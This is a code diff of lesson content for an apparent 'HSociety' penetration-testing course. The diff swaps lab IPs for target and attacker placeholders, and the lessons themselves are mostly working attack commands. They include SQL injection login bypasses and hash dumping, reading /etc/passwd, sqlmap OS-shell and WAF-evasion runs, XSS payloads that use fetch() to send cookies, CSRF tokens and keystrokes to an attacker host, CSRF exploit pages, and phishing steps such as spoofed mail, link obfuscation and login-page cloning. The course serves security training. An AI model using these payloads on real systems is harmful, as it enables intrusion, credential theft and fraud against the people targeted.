 \`\`\`bash
 # 5. Inspect every JS file for secrets or hardcoded endpoints (A02/A05)
-curl -s http://<target_ip>0/static/js/main.js | grep -E "key|secret|api"
+curl -s http://<target_ip>/static/js/main.js | grep -E "key|secret|api"
 
 # 6. Test for IDOR on every numeric ID found (A01)
 # Change ?id=1 to ?id=2, ?id=0, ?id=-1, ?id=9999
@@ -2947,10 +2947,10 @@ curl -s http://<target_ip>0/static/js/main.js | grep -E "key|secret|api"
 **Automated Vulnerability Probing:**
 \`\`\`bash
 # 7. Run a targeted 'Vuln' scan with Nmap scripts
-nmap --script vuln -p 80,443 10.10.10.100
+nmap --script vuln -p 80,443 <target_ip>
 
 # 8. Use 'nikto' for a comprehensive web server audit
-nikto -h http://<target_ip>0
+nikto -h http://<target_ip>
 \`\`\`
 
 **Reporting & Evidence Gathering:**
@@ -2959,10 +2959,10 @@ nikto -h http://<target_ip>0
 # (302 redirects to admin pages are high-value clues!)
 
 # 10. Save the raw request/response of your best finding
-curl -v http://<target_ip>0/api/admin/config > evidence_A01.txt 2>&1
+curl -v http://<target_ip>/api/admin/config > evidence_A01.txt 2>&1
 \`\`\`
 
-*Training Task:* Open the HSociety Lab App. Using only \`curl\`, find three different OWASP categories that the developers missed. Document your evidence as if you were writing a professional report.`,
+*Training Task:* Open the target application. Using only \`curl\`, find three different OWASP categories that the developers missed. Document your evidence as if you were writing a professional report.`,
               image: null,
             },
             {
@@ -3017,7 +3017,7 @@ res.send("<h1>Hello " + encodeHTML(req.query.name) + "</h1>");
 **Logging & Alerting (A09):**
 \`\`\`bash
 # Set up a 'Trap' (Honeytoken) for attackers
-# Log any access to 'http://<target_ip>0/admin/secret_config.bak'
+# Log any access to 'http://<target_ip>/admin/secret_config.bak'
 \`\`\`
 
 *Final Insight:* Security is a journey, not a destination. By understanding the OWASP Top 10, you have learned the 'rules of engagement' for the modern web. You are now ready to dive deep into specific exploit chains.`,
@@ -3048,43 +3048,43 @@ The \`-- \` comments out the password check. You are now logged in as admin.
 **2. Testing for Structural Weakness:**
 \`\`\`bash
 # Trigger a syntax error with a single quote
-curl "http://<target_ip>0/api/products?id=1'"
+curl "http://<target_ip>/api/products?id=1'"
 
 # Check for potential 'Boolean' based injection
-curl "http://<target_ip>0/api/products?id=1 AND 1=1" # Returns data
-curl "http://<target_ip>0/api/products?id=1 AND 1=2" # Returns nothing
+curl "http://<target_ip>/api/products?id=1 AND 1=1" # Returns data
+curl "http://<target_ip>/api/products?id=1 AND 1=2" # Returns nothing
 \`\`\`
 
 **3. Identifying Database Technology:**
 Different databases use different 'comment' characters and functions.
 \`\`\`bash
 # Check if it's MySQL/PostgreSQL (uses -- )
-curl "http://<target_ip>0/api/products?id=1 -- "
+curl "http://<target_ip>/api/products?id=1 -- "
 
 # Check if it's MS SQL Server (uses /* ... */)
-curl "http://<target_ip>0/api/products?id=1/*"
+curl "http://<target_ip>/api/products?id=1/*"
 \`\`\`
 
 **4. Fingerprinting via Version Functions:**
 \`\`\`bash
 # MySQL version check
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT @@version,NULL"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT @@version,NULL"
 
 # PostgreSQL version check
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT version(),NULL"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT version(),NULL"
 \`\`\`
 
 **5. Handling URL Encoding:**
 Operatives must encode special characters to ensure they reach the database intact.
 \`\`\`bash
 # ' = %27, space = %20 or +, -- = %2d%20
-curl "http://<target_ip>0/api/products?id=1%27%20OR%201=1%2d%2d%20"
+curl "http://<target_ip>/api/products?id=1%27%20OR%201=1%2d%2d%20"
 \`\`\`
 
 **6. Error-Based Enumeration:**
 \`\`\`bash
 # Force the database to reveal information in the error message
-curl "http://<target_ip>0/api/products?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- "
+curl "http://<target_ip>/api/products?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- "
 \`\`\`
 
 *Operative Drill:* Why is a 'Blind' SQL injection more difficult to exploit than an 'Error-Based' one? How does an HSociety operative use 'Time-Based' delays to extract data?`,
@@ -3098,41 +3098,41 @@ curl "http://<target_ip>0/api/products?id=1' AND (SELECT 1 FROM (SELECT COUNT(*)
 **1. Classic 'OR' Payloads:**
 \`\`\`bash
 # Bypassing a standard login form
-curl -d "user=' OR 1=1 -- &pass=anything" -X POST http://<target_ip>0/login
+curl -d "user=' OR 1=1 -- &pass=anything" -X POST http://<target_ip>/login
 
 # Using numeric comparisons for stealth
-curl -d "user=' OR 9>1 #&pass=x" -X POST http://<target_ip>0/login
+curl -d "user=' OR 9>1 #&pass=x" -X POST http://<target_ip>/login
 \`\`\`
 
 **2. Targeting Specific Accounts:**
 \`\`\`bash
 # Log in as the first user in the table (usually Admin)
-curl -d "user=' OR 1=1 LIMIT 1 -- &pass=x" -X POST http://<target_ip>0/login
+curl -d "user=' OR 1=1 LIMIT 1 -- &pass=x" -X POST http://<target_ip>/login
 \`\`\`
 
 **3. Exploiting Username Enumeration:**
 \`\`\`bash
 # Check if 'admin' exists by observing the error message
-curl -d "user=admin' AND (SELECT 1)=1 -- &pass=x" -X POST http://<target_ip>0/login
+curl -d "user=admin' AND (SELECT 1)=1 -- &pass=x" -X POST http://<target_ip>/login
 \`\`\`
 
 **4. Extracting the Schema (The Map):**
 Once inside, we need to know where the passwords live.
 \`\`\`bash
 # List all table names in the current database
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT table_name,NULL FROM information_schema.tables"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT table_name,NULL FROM information_schema.tables"
 \`\`\`
 
 **5. Finding the 'Users' Table Columns:**
 \`\`\`bash
 # Identify the column names for the 'users' table
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'"
 \`\`\`
 
 **6. The Grand Finale: Dumping Hashes:**
 \`\`\`bash
 # Extract usernames and password hashes
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT username,password FROM users"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT username,password FROM users"
 \`\`\`
 
 *Training Task:* You've extracted a hash: \`5f4dcc3b5aa765d61d8327deb882cf99\`. Use the terminal to identify the hashing algorithm (MD5, SHA1, etc.) and attempt to crack it using an online database or \`hashcat\`.`,
@@ -3147,43 +3147,43 @@ curl "http://<target_ip>0/api/products?id=1 UNION SELECT username,password FROM 
 The UNION operator requires the same number of columns in both queries.
 \`\`\`bash
 # Increment the number until the error disappears (ORDER BY trick)
-curl "http://<target_ip>0/api/products?id=1 ORDER BY 1--"
-curl "http://<target_ip>0/api/products?id=1 ORDER BY 2--"
-curl "http://<target_ip>0/api/products?id=1 ORDER BY 3--" # If this fails, we have 2 columns.
+curl "http://<target_ip>/api/products?id=1 ORDER BY 1--"
+curl "http://<target_ip>/api/products?id=1 ORDER BY 2--"
+curl "http://<target_ip>/api/products?id=1 ORDER BY 3--" # If this fails, we have 2 columns.
 \`\`\`
 
 **2. Identifying Data Types:**
 We need to know which columns can display text.
 \`\`\`bash
 # Replace NULLs with strings to see where they appear on the page
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT 'test1','test2'"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT 'test1','test2'"
 \`\`\`
 
 **3. Extracting System Information:**
 \`\`\`bash
 # Get the current database user and name
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT user(),database()"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT user(),database()"
 \`\`\`
 
 **4. Concatenating Multiple Columns:**
 If only one column is displayed, combine your data into a single string.
 \`\`\`bash
 # Use CONCAT to pull user:pass in one go
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT CONCAT(username,':',password),NULL FROM users"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT CONCAT(username,':',password),NULL FROM users"
 \`\`\`
 
 **5. Bypassing Filters with Hex Encoding:**
 If the WAF blocks 'users', encode the table name in hex.
 \`\`\`bash
 # 'users' in hex = 0x7573657273
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT password,NULL FROM users WHERE username=0x61646d696e"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT password,NULL FROM users WHERE username=0x61646d696e"
 \`\`\`
 
 **6. Reading Files from the OS:**
 In high-privilege scenarios, the database can read local files.
 \`\`\`bash
 # Attempt to read the system passwd file
-curl "http://<target_ip>0/api/products?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL"
+curl "http://<target_ip>/api/products?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL"
 \`\`\`
 
 *Operative Insight:* Always check if you can write files too! \`SELECT ... INTO OUTFILE '/var/www/html/shell.php'\` is how an HSociety operative turns a SQL injection into a full web shell.`,
@@ -3197,19 +3197,19 @@ curl "http://<target_ip>0/api/products?id=1 UNION SELECT LOAD_FILE('/etc/passwd'
 **1. Basic Automated Probing:**
 \`\`\`bash
 # Detect and confirm the injection point
-sqlmap -u "http://<target_ip>0/api/products?id=1" --batch
+sqlmap -u "http://<target_ip>/api/products?id=1" --batch
 \`\`\`
 
 **2. Enumerating the Infrastructure:**
 \`\`\`bash
 # List all databases and identify the current user's privileges
-sqlmap -u "http://<target_ip>0/api/products?id=1" --dbs --is-dba
+sqlmap -u "http://<target_ip>/api/products?id=1" --dbs --is-dba
 \`\`\`
 
 **3. Targeting Specific Data:**
 \`\`\`bash
 # Dump the 'users' table from the 'hsociety_prod' database
-sqlmap -u "http://<target_ip>0/api/products?id=1" -D hsociety_prod -T users --dump
+sqlmap -u "http://<target_ip>/api/products?id=1" -D hsociety_prod -T users --dump
 \`\`\`
 
 **4. Handling POST Requests & Cookies:**
@@ -3218,20 +3218,20 @@ sqlmap -u "http://<target_ip>0/api/products?id=1" -D hsociety_prod -T users --du
 sqlmap -r request.txt --level 3 --risk 2
 
 # Provide your session cookie to bypass login walls
-sqlmap -u "http://<target_ip>0/admin/view?id=1" --cookie="session=trainee_123"
+sqlmap -u "http://<target_ip>/admin/view?id=1" --cookie="session=trainee_123"
 \`\`\`
 
 **5. Evading WAF/IDS with Tampers:**
 If your scan is being blocked, change the signature of your payloads.
 \`\`\`bash
 # Use the 'space2comment' tamper to bypass simple keyword filters
-sqlmap -u "http://<target_ip>0/api/products?id=1" --tamper=space2comment
+sqlmap -u "http://<target_ip>/api/products?id=1" --tamper=space2comment
 \`\`\`
 
 **6. Gaining System-Level Access:**
 \`\`\`bash
 # Attempt to spawn an interactive OS shell (Requires high DB privileges)
-sqlmap -u "http://<target_ip>0/api/products?id=1" --os-shell
+sqlmap -u "http://<target_ip>/api/products?id=1" --os-shell
 \`\`\`
 
 *Final Training Project:* Perform a full audit of the HSociety target app. Document the vulnerable parameter, the database version, and extract the admin hash. Then, write a one-paragraph 'Remediation Guide' for the developers, explaining how to use **Parameterized Queries** to kill this bug forever.`,
@@ -3255,45 +3255,45 @@ sqlmap -u "http://<target_ip>0/api/products?id=1" --os-shell
 The payload is sent in the URL and reflected back.
 \`\`\`bash
 # Basic alert to prove execution
-curl "http://<target_ip>0/search?q=<script>alert('HSociety')</script>"
+curl "http://<target_ip>/search?q=<script>alert('HSociety')</script>"
 
 # Bypassing simple filters with an image tag
-curl "http://<target_ip>0/search?q=<img src=x onerror=alert(1)>"
+curl "http://<target_ip>/search?q=<img src=x onerror=alert(1)>"
 \`\`\`
 
 **2. Stored XSS (The Persistent Trap):**
 The payload is saved on the server (e.g., in a comment or profile).
 \`\`\`bash
 # Submit a payload via a POST request to the comments section
-curl -d "comment=<script>fetch('http://10.10.10.15/log?c=' %2b document.cookie)</script>" -X POST http://<target_ip>0/api/comments
+curl -d "comment=<script>fetch('http://<attacker_ip>/log?c=' %2b document.cookie)</script>" -X POST http://<target_ip>/api/comments
 \`\`\`
 
 **3. DOM-Based XSS (The Client-Side Shadow):**
 The vulnerability lives in the client-side JavaScript, not the server response.
 \`\`\`text
-Target URL: http://<target_ip>0/dashboard#user=<img src=x onerror=alert(1)>
+Target URL: http://<target_ip>/dashboard#user=<img src=x onerror=alert(1)>
 # (The payload after '#' is never sent to the server but processed by the browser)
 \`\`\`
 
 **4. Bypassing Script-Tag Filters:**
 \`\`\`bash
 # Use SVG tags for execution
-curl "http://<target_ip>0/search?q=<svg/onload=alert(1)>"
+curl "http://<target_ip>/search?q=<svg/onload=alert(1)>"
 
 # Use encoded characters to hide the payload
-curl "http://<target_ip>0/search?q=%3cscript%3ealert(1)%3c/script%3e"
+curl "http://<target_ip>/search?q=%3cscript%3ealert(1)%3c/script%3e"
 \`\`\`
 
 **5. Testing for Filter Weaknesses:**
 \`\`\`bash
 # Check if the application removes 'script' tags but leaves the inner content
-curl "http://<target_ip>0/search?q=<scr<script>ipt>alert(1)</script>"
+curl "http://<target_ip>/search?q=<scr<script>ipt>alert(1)</script>"
 \`\`\`
 
 **6. Automated XSS Probing:**
 \`\`\`bash
 # Use Nmap scripts to find common XSS points
-nmap -p 80 --script http-xssed 10.10.10.100
+nmap -p 80 --script http-xssed <target_ip>
 \`\`\`
 
 *Operative Drill:* Why is Stored XSS considered more dangerous than Reflected XSS in a professional engagement? How can an HSociety operative use Stored XSS to compromise an entire organization?`,
@@ -3308,7 +3308,7 @@ nmap -p 80 --script http-xssed 10.10.10.100
 \`\`\`javascript
 // Payload to send the victim's session cookie to your listener
 <script>
-    fetch('http://10.10.10.15/steal?cookie=' + btoa(document.cookie));
+    fetch('http://<attacker_ip>/steal?cookie=' + btoa(document.cookie));
 </script>
 \`\`\`
 
@@ -3318,7 +3318,7 @@ If an app has CSRF protection, use XSS to read the token and bypass it.
 // Read a hidden input field named 'csrf_token'
 <script>
     var token = document.getElementsByName('csrf_token')[0].value;
-    fetch('http://10.10.10.15/token?v=' + token);
+    fetch('http://<attacker_ip>/token?v=' + token);
 </script>
 \`\`\`
 
@@ -3327,7 +3327,7 @@ If an app has CSRF protection, use XSS to read the token and bypass it.
 // Record every key the user types on the page
 <script>
     document.onkeypress = function(e) {
-        fetch('http://10.10.10.15/keys?k=' + e.key);
+        fetch('http://<attacker_ip>/keys?k=' + e.key);
     };
 </script>
 \`\`\`
@@ -3351,7 +3351,7 @@ echo "c2Vzc2lvbj10cmFpbmVlXzEyMw==" | base64 -d
 \`\`\`javascript
 // Silently redirect the user to a fake login page
 <script>
-    window.location.replace('http://<target_ip>0');
+    window.location.replace('http://<target_ip>');
 </script>
 \`\`\`
 
@@ -3367,7 +3367,7 @@ echo "c2Vzc2lvbj10cmFpbmVlXzEyMw==" | base64 -d
 Look for state-changing requests (POST/PUT/DELETE) that lack a random token.
 \`\`\`http
 POST /api/user/change-email HTTP/1.1
-Host: 10.10.10.100
+Host: <target_ip>
 Cookie: session=victim_token
 
 email=hacker@<target_ip>
@@ -3375,10 +3375,10 @@ email=hacker@<target_ip>
 
 **2. Crafting the Exploit Page:**
 \`\`\`html
-<!-- Hosted on 10.10.10.15 -->
+<!-- Hosted on <attacker_ip> -->
 <html>
   <body onload="document.forms[0].submit()">
-    <form action="http://<target_ip>0/api/user/change-email" method="POST">
+    <form action="http://<target_ip>/api/user/change-email" method="POST">
       <input type="hidden" name="email" value="hacker@<target_ip>" />
     </form>
   </body>
@@ -3388,13 +3388,13 @@ email=hacker@<target_ip>
 **3. Testing for Token Presence via CLI:**
 \`\`\`bash
 # Check the raw HTML of a form for a CSRF token
-curl -s http://<target_ip>0/settings | grep -i "token"
+curl -s http://<target_ip>/settings | grep -i "token"
 \`\`\`
 
 **4. Bypassing Weak Token Validation:**
 \`\`\`bash
 # Try removing the token entirely to see if the server still accepts the request
-curl -d "email=10.10.10.15" -X POST http://<target_ip>0/api/user/change-email
+curl -d "email=<attacker_ip>" -X POST http://<target_ip>/api/user/change-email
 
 # Try using a token from a different user session
 curl -b "session=hacker_token" -d "token=VICTIM_TOKEN" ...
@@ -3403,13 +3403,13 @@ curl -b "session=hacker_token" -d "token=VICTIM_TOKEN" ...
 **5. Exploiting GET-Based CSRF:**
 (The easiest to exploit—can be triggered via a simple \`<img>\` tag)
 \`\`\`html
-<img src="http://<target_ip>0/api/admin/delete-user?id=100" style="display:none;" />
+<img src="http://<target_ip>/api/admin/delete-user?id=100" style="display:none;" />
 \`\`\`
 
 **6. Analyzing the 'Referer' Check:**
 \`\`\`bash
 # Test if the server only checks the Referer header (spoof it!)
-curl -e "http://<target_ip>0/" -d "action=delete" http://<target_ip>0/api/data
+curl -e "http://<target_ip>/" -d "action=delete" http://<target_ip>/api/data
 \`\`\`
 
 *Operative Insight:* CSRF tokens must be **Random, Unique per session, and Validated on the server**. If any of these are missing, the HSociety operative has an opening.`,
@@ -3423,7 +3423,7 @@ curl -e "http://<target_ip>0/" -d "action=delete" http://<target_ip>0/api/data
 **1. Auditing a CSP Header:**
 \`\`\`bash
 # Extract and analyze the CSP header of a target
-curl -s -I http://<target_ip>0 | grep -i "Content-Security-Policy"
+curl -s -I http://<target_ip> | grep -i "Content-Security-Policy"
 \`\`\`
 
 **2. Identifying 'Unsafe' Directives:**
@@ -3436,7 +3436,7 @@ Policy: script-src 'self' 'unsafe-inline';
 **3. Testing CSP Restrictions:**
 \`\`\`bash
 # Try to load a script from an external domain
-curl "http://<target_ip>0/search?q=<script src='http://10.10.10.15/xss.js'></script>"
+curl "http://<target_ip>/search?q=<script src='http://<attacker_ip>/xss.js'></script>"
 # (The browser will block this if 'script-src' is set to 'self')
 \`\`\`
 
@@ -3734,14 +3734,14 @@ cewl -d 2 -m 5 http://<target_ip> -w custom_pretext.txt
 site:<social_professional_site>/in "HSociety" "Engineer"
 
 # Construct a list of potential targets based on job titles
-echo "admin@10.10.10.10" >> targets.txt
-echo "hr@10.10.10.10" >> targets.txt
+echo "admin@<target_ip>" >> targets.txt
+echo "hr@<target_ip>" >> targets.txt
 \`\`\`
 
 **Simulating a Social Engineering Scenario:**
 \`\`\`bash
 # Generate a list of 'typosquat' domains to use in a phishing campaign
-dnstwist --format csv 10.10.10.10 > typosquats.csv
+dnstwist --format csv <target_ip> > typosquats.csv
 \`\`\`
 
 *Operative Drill:* Look at a real phishing email. Identify the 'Call to Action.' Does it use Urgency ("Reset now") or Authority ("By order of the CEO")? How would an HSociety operative combine both?`,
@@ -3758,36 +3758,36 @@ dnstwist --format csv 10.10.10.10 > typosquats.csv
 dig <target_domain> TXT | grep "v=spf1"
 
 # Verify if DKIM or DMARC is implemented correctly
-dig _dmarc.10.10.10.10 TXT
+dig _dmarc.<target_ip> TXT
 \`\`\`
 
 **2. Crafting the Malicious Link:**
 \`\`\`bash
 # Use a URL shortener to hide the true destination (e.g., bit.ly)
-# http://bit.ly/hsociety-training -> http://10.10.10.15/login-clone
+# http://bit.ly/hsociety-training -> http://<attacker_ip>/login-clone
 
 # Create an HTML-encoded link to bypass basic scanners
-echo -n "http://10.10.10.15/steal" | base64
+echo -n "http://<attacker_ip>/steal" | base64
 # aHR0cDovL2hhY2tlci5sYWIvc3RlYWw=
 \`\`\`
 
 **3. Simulating Sender Forgery:**
 \`\`\`bash
 # Use 'sendemail' to simulate a spoofed message (requires an open relay)
-sendemail -f admin@10.10.10.10 -t trainee@lab -u "URGENT: Password Reset" -m "Click here: http://10.10.10.15/reset"
+sendemail -f admin@<target_ip> -t trainee@target.local -u "URGENT: Password Reset" -m "Click here: http://<attacker_ip>/reset"
 \`\`\`
 
 **4. Harvesting OSINT for the Pretext:**
 \`\`\`bash
 # Find old email addresses associated with the target domain
-theHarvester -d 10.10.10.10 -l 500 -b google
+theHarvester -d <target_ip> -l 500 -b google
 \`\`\`
 
 **5. Building a Credential Harvester:**
 Clone the target's login page using \`httrack\` or the Social Engineer Toolkit (SET).
 \`\`\`bash
 # Clone a single page for a phishing landing site
-httrack "http://<target_ip>0/login" -O "./clone_site"
+httrack "http://<target_ip>/login" -O "./clone_site"
 \`\`\`
 
 **6. Analyzing Email Headers (Surveillance):**
@@ -3807,7 +3807,7 @@ grep "Received: from" raw_email.txt | awk '{print $4}'
 **1. The Pretext Blueprint:**
 - **The Role:** Who are you? (IT Helpdesk, External Auditor, New Hire).
 - **The Reason:** Why are you calling? (Critical patch, mandatory survey).
-- **The Hook:** What do you want? (VPN token, internal IP, manager's name).
+- **The Hook:** What do you want? (VPN token, private IP, manager's name).
 - **The Deadline:** Why now? (Server reboot in 10 mins).
 
 **2. Weaponizing Internal Knowledge:**
@@ -3849,7 +3849,7 @@ site:news.<search_engine> "HSociety" "Acquisition"
 \`\`\`bash
 # Train users to hover over every link to see the real URL
 # Link: http://<target_ip>/verify
-# Actual: http://10.10.10.15/log?user=123
+# Actual: http://<attacker_ip>/log?user=123
 \`\`\`
 
 **2. Implementing 'Out-of-Band' Auth:**
@@ -3858,7 +3858,7 @@ Never trust a single channel. If someone calls asking for a password, verify the
 **3. Auditing SPF/DMARC Policies:**
 \`\`\`bash
 # Ensure the domain policy is set to 'Reject' (p=reject)
-dig _dmarc.10.10.10.10 TXT | grep "p=reject"
+dig _dmarc.<target_ip> TXT | grep "p=reject"
 \`\`\`
 
 **4. Email Sandboxing:**
@@ -3923,7 +3923,7 @@ site:<target_domain> "Apache2 Ubuntu Default Page"
 **Operative Research:**
 \`\`\`bash
 # Search Pastebin and other dump sites for the target domain
-site:<paste_site> "10.10.10.10"
+site:<paste_site> "<target_ip>"
 
 # Look for employee names associated with the domain
 site:<target_domain> "email" "contact"
@@ -3953,10 +3953,10 @@ The Google Hacking Database (GHDB) is your library of pre-built dorks.
 **1. Aggregating Emails & Subdomains:**
 \`\`\`bash
 # Use 'theHarvester' to find emails, names, and IPs
-theHarvester -d 10.10.10.10 -l 500 -b google,bing,crtsh
+theHarvester -d <target_ip> -l 500 -b google,bing,crtsh
 
 # Extract only the discovered email addresses to a file
-theHarvester -d 10.10.10.10 -b all | grep "@" | sort -u > emails.txt
+theHarvester -d <target_ip> -b all | grep "@" | sort -u > emails.txt
 \`\`\`
 
 **2. Shodan: The Search Engine for Things:**
@@ -3986,23 +3986,23 @@ recon-ng
 # Install and use a module to find hosts from a domain
 marketplace install recon/domains-hosts/hackertarget
 modules load recon/domains-hosts/hackertarget
-options set SOURCE 10.10.10.10
+options set SOURCE <target_ip>
 run
 \`\`\`
 
 **5. Certificate Transparency (CRT.sh):**
 \`\`\`bash
 # Find subdomains by searching public SSL certificate logs
-curl -s "https://crt.sh/?q=10.10.10.10&output=json" | jq -r '.[].name_value' | sort -u
+curl -s "https://crt.sh/?q=<target_ip>&output=json" | jq -r '.[].name_value' | sort -u
 \`\`\`
 
 **6. WHOIS & Infrastructure Ownership:**
 \`\`\`bash
 # Identify the registrar and nameservers for a domain
-whois 10.10.10.10
+whois <target_ip>
 
 # Find other domains hosted on the same IP (Shared hosting check)
-dig +short 10.10.10.10 | xargs -I {} curl -s "https://api.hacker<target_site>/reverseiplookup/?q={}"
+dig +short <target_ip> | xargs -I {} curl -s "https://api.hacker<target_site>/reverseiplookup/?q={}"
 \`\`\`
 
 *Hacker's Strategy:* Shodan is your 'Time Machine.' It shows you what was open yesterday, even if the target has closed the port today. Use it to find 'Shadow IT' that the security team forgot about.`,
@@ -4024,19 +4024,19 @@ site:<social_professional_site>/in "HSociety" "Security Analyst" OR "SysAdmin"
 
 **2. Building Naming Convention Lists:**
 \`\`\`bash
-# If you find 'j.smith@10.10.10.10', the pattern is 'first_initial.last'
+# If you find 'j.smith@<target_ip>', the pattern is 'first_initial.last'
 # Construct a list for a new name: 'Alice Cooper'
-echo "a.cooper@10.10.10.10" >> wordlist.txt
+echo "a.cooper@<target_ip>" >> wordlist.txt
 \`\`\`
 
 **3. GitHub Recon: Searching for Leaks:**
 Developers often accidentally commit API keys or passwords.
 \`\`\`bash
 # Search GitHub for the target's internal domain
-site:<code_repo_site> "10.10.10.10" "password"
+site:<code_repo_site> "<target_ip>" "password"
 
 # Search for hardcoded internal API endpoints
-site:<code_repo_site> "10.10.10.10" "api_key"
+site:<code_repo_site> "<target_ip>" "api_key"
 \`\`\`
 
 **4. Identifying Technology via Job Posts:**
@@ -4056,7 +4056,7 @@ site:<social_media_site> "HSociety" "office"
 **6. Passive DNS History:**
 \`\`\`bash
 # See where the domain pointed in the past (Find old servers)
-curl -s "https://api.hacker<target_site>/reversedns/?q=10.10.10.10"
+curl -s "https://api.hacker<target_site>/reversedns/?q=<target_ip>"
 \`\`\`
 
 *Operative Drill:* Find a public GitHub repo for a large project. Can you find any 'TODO' comments in the code that mention security issues? These are often the 'First Domino' in an HSociety engagement.`,
@@ -4249,7 +4249,7 @@ sudo photorec /dev/sdb
 
 **4. Interrogating Recovered Configs:**
 \`\`\`bash
-# Extract the configuration from a discarded router to find internal IPs
+# Extract the configuration from a discarded router to find target IPs
 cat config.bak | grep "interface" -A 5
 \`\`\`
 
